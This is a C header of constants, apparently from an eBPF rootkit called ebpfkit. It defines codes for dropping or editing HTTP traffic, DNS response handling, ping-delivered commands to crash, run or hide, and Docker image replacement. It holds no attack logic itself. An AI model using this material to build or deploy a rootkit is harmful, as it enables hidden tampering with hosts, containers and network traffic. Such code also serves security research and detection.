/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */
/* Copyright (c) 2020
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of version 2 of the GNU General Public
 * License as published by the Free Software Foundation.
 */
#ifndef _CONST_H_
#define _CONST_H_

#define HTTP_PASS 0
#define HTTP_DROP 1
#define HTTP_EDIT 2

#ifndef HTTP_REQ_PATTERN
#define HTTP_REQ_PATTERN 61
#endif

#define HTTP_REQ_LEN 500
#define HTTP_RESP_LEN 629

#define HTTP_ACTION_HANDLER 0
#define HTTP_GET_FS_WATCH_HANDLER 3
#define DNS_RESP_HANDLER 4
#define XDP_DISPATCH 11
#define TC_DISPATCH 12

#define INGRESS_FLOW 1
#define EGRESS_FLOW 2

#define DNS_PORT 53
#define DNS_MAX_LENGTH 256
#define DNS_A_RECORD 1
#define DNS_COMPRESSION_FLAG 3

#define PING_NOP_CHR '0'
#define PING_CRASH_CHR '1'
#define PING_RUN_CHR '2'
#define PING_HIDE_CHR '3'

#define PING_NOP 0
#define PING_CRASH 1
#define PING_RUN 2
#define PING_HIDE 3

#define DOCKER_IMAGE_LEN 64

#define DOCKER_IMAGE_NOP_CHR '0'
#define DOCKER_IMAGE_REPLACE_CHR '1'

#define DOCKER_IMAGE_NOP 0
#define DOCKER_IMAGE_REPLACE 1

#define DEDICATED_WATCH_KEY_DOCKER 0
#define DEDICATED_WATCH_KEY_POSTGRES 1
#define DEDICATED_WATCH_KEY_NETWORK_DISCOVERY 2

#define LOAD_CONSTANT(param, var) asm("%0 = " param " ll" : "=r"(var))

__attribute__((always_inline)) static u16 load_http_server_port() {
    u64 http_server_port = 0;
    LOAD_CONSTANT("http_server_port", http_server_port);
    return (u16)http_server_port;
}

__attribute__((always_inline)) static u32 get_ebpfkit_pid() {
    u64 ebpfkit_pid = 0;
    LOAD_CONSTANT("ebpfkit_pid", ebpfkit_pid);
    return (u32)ebpfkit_pid;
}

#endif
